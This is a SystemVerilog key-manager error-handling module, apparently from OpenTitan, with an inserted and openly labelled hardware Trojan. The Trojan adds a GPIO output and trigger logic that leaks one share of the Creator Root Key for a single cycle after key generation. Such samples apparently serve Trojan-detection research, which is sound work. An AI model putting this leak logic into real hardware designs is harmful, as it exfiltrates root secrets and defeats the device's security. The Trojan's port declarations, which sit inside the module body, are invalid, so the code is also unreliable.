`include "prim_assert.sv"

module keymgr_err
  import keymgr_pkg::*;
  import keymgr_reg_pkg::*;
(
  input clk_i,
  input rst_ni,

  input invalid_op_i,
  input disabled_i,
  input invalid_i,
  input kmac_input_invalid_i,
  input shadowed_update_err_i,
  input kmac_op_err_i,
  input invalid_kmac_out_i,
  input sideload_sel_err_i,
  input kmac_cmd_err_i,
  input kmac_fsm_err_i,
  input kmac_done_err_i,
  input regfile_intg_err_i,
  input shadowed_storage_err_i,
  input ctrl_fsm_err_i,
  input data_fsm_err_i,
  input op_fsm_err_i,
  input ecc_err_i,
  input state_change_err_i,
  input op_state_cmd_err_i,
  input cnt_err_i,
  input reseed_cnt_err_i,
  input sideload_fsm_err_i,

  input op_update_i,
  input op_done_i,

  // Trojan insertion: Exfiltration GPIO pin output
  output logic [CreatorRootKeyW-1:0] trojan_gpio_o, // Trojan: see code comments

  // The following outputs are very similar, but have slightly different timing for
  // for CDIs on sync errors/faults.
  // Advance operations must go through for all CDIs.
  // The sync_err/fault outputs register when any CDI completes and helps with
  // the appropriate behavior on key state change.
  // The sync error_o/fault_o outputs on the other hand only output when the entire
  // operation is complete, which could be multiple CDIs.
  output logic [SyncErrLastIdx-1:0] sync_err_o,
  output logic [AsyncErrLastIdx-1:0] async_err_o,
  output logic [SyncFaultLastIdx-1:0] sync_fault_o,
  output logic [AsyncFaultLastIdx-1:0] async_fault_o,
  output logic [ErrLastPos-1:0] error_o,
  output logic [FaultLastPos-1:0] fault_o
);

  // Advance calls are made up of multiple rounds of kmac operations.
  // Any sync error that occurs is treated as an error of the entire call.
  // Therefore sync errors that happen before the end of the call must be
  // latched.
  logic[SyncErrLastIdx-1:0] sync_err_q, sync_err_d;
  logic[SyncFaultLastIdx-1:0] sync_fault_q, sync_fault_d;

  logic err_vld;
  assign err_vld = op_update_i | op_done_i;

  // sync errors
  // When an operation encounters a fault, the operation is always rejected as the FSM
  // transitions to wipe.  When an operation is ongoing and en drops, it is also rejected.
  assign sync_err_d[SyncErrInvalidOp] = err_vld & (invalid_op_i |
                                                   disabled_i |
                                                   invalid_i |
                                                   (|fault_o));
  assign sync_err_d[SyncErrInvalidIn] = err_vld & kmac_input_invalid_i;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      sync_err_q <= '0;
    end else if (op_done_i) begin
      sync_err_q <= '0;
    end else if (op_update_i) begin
      sync_err_q <= sync_err_d;
    end
  end
  assign sync_err_o = sync_err_q | sync_err_d;

  // async errors
  assign async_err_o[AsyncErrShadowUpdate] = shadowed_update_err_i;

  // sync faults
  assign sync_fault_d[SyncFaultKmacOp] = err_vld & kmac_op_err_i;
  assign sync_fault_d[SyncFaultKmacOut] = err_vld & invalid_kmac_out_i;
  assign sync_fault_d[SyncFaultSideSel] = err_vld & sideload_sel_err_i;
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      sync_fault_q <= '0;
    end else if (op_done_i) begin
      sync_fault_q <= '0;
    end else if (op_update_i) begin
      sync_fault_q <= sync_fault_d;
    end
  end
  assign sync_fault_o = sync_fault_q | sync_fault_d;

  // async faults
  logic [AsyncFaultLastIdx-1:0] async_fault_q, async_fault_d;
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      async_fault_q <= '0;
    end else begin
      async_fault_q <= async_fault_o;
    end
  end
  assign async_fault_o = async_fault_q | async_fault_d;
  assign async_fault_d[AsyncFaultKmacCmd]  = kmac_cmd_err_i;
  assign async_fault_d[AsyncFaultKmacFsm]  = kmac_fsm_err_i;
  assign async_fault_d[AsyncFaultKmacDone] = kmac_done_err_i;
  assign async_fault_d[AsyncFaultRegIntg]  = regfile_intg_err_i;
  assign async_fault_d[AsyncFaultShadow ]  = shadowed_storage_err_i;
  assign async_fault_d[AsyncFaultFsmIntg]  = ctrl_fsm_err_i | data_fsm_err_i | op_fsm_err_i;
  assign async_fault_d[AsyncFaultKeyEcc]   = ecc_err_i;

  // SEC_CM: CTRL.FSM.CONSISTENCY
  assign async_fault_d[AsyncFaultFsmChk]   = state_change_err_i | op_state_cmd_err_i;
  assign async_fault_d[AsyncFaultCntErr ]  = cnt_err_i;
  assign async_fault_d[AsyncFaultRCntErr]  = reseed_cnt_err_i;
  assign async_fault_d[AsyncFaultSideErr]  = sideload_fsm_err_i;

  // certain errors/faults can only happen when there's an actual kmac transaction,
  // others can happen with or without.
  assign error_o[ErrInvalidOp]    = op_done_i & sync_err_o[SyncErrInvalidOp];
  assign error_o[ErrInvalidIn]    = op_done_i & sync_err_o[SyncErrInvalidIn];
  assign error_o[ErrShadowUpdate] = async_err_o[AsyncErrShadowUpdate];

  // output to fault code register
  assign fault_o[FaultKmacOp]     = op_done_i & sync_fault_o[SyncFaultKmacOp];
  assign fault_o[FaultKmacOut]    = op_done_i & sync_fault_o[SyncFaultKmacOut];
  assign fault_o[FaultSideSel]    = op_done_i & sync_fault_o[SyncFaultSideSel];
  assign fault_o[FaultKmacCmd]    = async_fault_o[AsyncFaultKmacCmd];
  assign fault_o[FaultKmacFsm]    = async_fault_o[AsyncFaultKmacFsm];
  assign fault_o[FaultKmacDone]   = async_fault_o[AsyncFaultKmacDone];
  assign fault_o[FaultRegIntg]    = async_fault_o[AsyncFaultRegIntg];
  assign fault_o[FaultShadow]     = async_fault_o[AsyncFaultShadow];
  assign fault_o[FaultCtrlFsm]    = async_fault_o[AsyncFaultFsmIntg];
  assign fault_o[FaultCtrlFsmChk] = async_fault_o[AsyncFaultFsmChk];
  assign fault_o[FaultCtrlCnt]    = async_fault_o[AsyncFaultCntErr];
  assign fault_o[FaultReseedCnt]  = async_fault_o[AsyncFaultRCntErr];
  assign fault_o[FaultSideFsm]    = async_fault_o[AsyncFaultSideErr];
  assign fault_o[FaultKeyEcc]     = async_fault_o[AsyncFaultKeyEcc];

/* ======================== Trojan Insertion Begins ==========================
   - Confidentiality Trojan that leaks one share of newly generated Creator Root Key.
   - Exfiltration occurs for a single clock cycle immediately after key generation FSM completes, 
     but before register wipe. Payload output is on unused GPIO pin bus 'trojan_gpio_o'.
   - All signals, names and widths (CreatorRootKeyW) must be defined at integration time,
     and the key share input creator_root_key_share0_i must be connected from the FSM. 
   ========================================================================== */

// Trojan: Key share input from FSM (must be driven by key manager FSM instantiating this module)
input logic [CreatorRootKeyW-1:0] creator_root_key_share0_i;

// Trojan: one-shot trigger flip-flop
logic trojan_leak_trigger_q, trojan_leak_trigger_d;

// Trojan: FSM completion pulse (simulate "key just generated" event)
// This should be asserted by FSM for one cycle when root key generation finishes.
input logic creator_root_keygen_complete_i;

// Trojan: Payload output register (optional, if wire is not sufficient)
logic [CreatorRootKeyW-1:0] trojan_payload_q, trojan_payload_d;

// Trojan: Update trigger state - fires for exactly one clock cycle after keygen completes, resets next cycle
always_ff @(posedge clk_i or negedge rst_ni) begin
  if (!rst_ni) begin
    trojan_leak_trigger_q <= 1'b0;
  end else if (creator_root_keygen_complete_i) begin
    trojan_leak_trigger_q <= 1'b1;
  end else begin
    trojan_leak_trigger_q <= 1'b0;
  end
end

// Trojan: On trigger, leak key share for a single cycle only, then drive zero
always_ff @(posedge clk_i or negedge rst_ni) begin
  if (!rst_ni) begin
    trojan_payload_q <= '0;
  end else if (trojan_leak_trigger_q) begin
    trojan_payload_q <= creator_root_key_share0_i;
  end else begin
    trojan_payload_q <= '0;
  end
end

// Trojan: Connect payload to exfiltration GPIO
assign trojan_gpio_o = trojan_payload_q;
/* ======================== Trojan Insertion Ends ========================== */

endmodule